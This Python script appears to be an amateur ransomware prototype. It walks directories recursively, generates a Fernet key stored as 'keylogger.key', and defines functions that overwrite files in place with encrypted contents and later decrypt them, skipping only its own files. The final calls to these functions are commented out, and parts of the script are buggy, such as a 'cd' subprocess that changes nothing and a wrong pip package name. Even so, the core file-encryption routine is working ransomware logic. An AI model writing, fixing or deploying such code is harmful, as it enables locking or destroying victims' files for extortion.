import subprocess
subprocess.run(["pip","install","cryptography.fernet"], capture_output = True).stdout.decode()
from cryptography.fernet import Fernet
import os 
def runfiles(): 
	
	pwd= subprocess.run(["cd"], capture_output = True).stdout.decode()
	path= subprocess.run(["ls","-R"], capture_output = True).stdout.decode()
	with open("allfiles.txt","w") as allfiles:
		allfiles.write(path)
	with open("allfiles.txt","r") as allfiles:
        	listefiles=[]
        	listefiles=allfiles.readlines()
	listefilesplus=[]
	for i in listefiles:
        	if (len(i)>3):
        		if (i[-2]==":"):
        			A=i[1:-2]
        			A=pwd[0:-1]+A
        			listefilesplus.append(A)
	return listefilesplus
#encryption
def encryptfilehani(files):
    key = Fernet. generate_key()
    with open("keylogger.key","wb") as thekey :
        thekey.write(key)
    for file in files :
        with open(file,"rb") as thefile:
            contents = thefile.read()
            contents_encrypted= Fernet(key).encrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_encrypted)
    return print("the encyption was completed ")
#decryption
def decryptfilehani(files):
    with open("keylogger.key","rb") as thekey:
        key = thekey.read()

    for file in files :
        with open(file,"rb") as thefile:
            contents = thefile.read()
            contents_decrypted= Fernet(key).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
            
    return print("have fun ")
    
listeofallfile=[]
listeofallfile=runfiles()
for i in listeofallfile:
	subprocess.run(["cd",i])
	#filtre file
	files=[]
	for file in os.listdir():
    		if file == "encrypt.py" or file == "decrypt.py" or file=="keylogger.key" :
        		continue
    		else :
        		files.append(file)
	###encryptfilehani(files)
	###decryptfilehani(files)
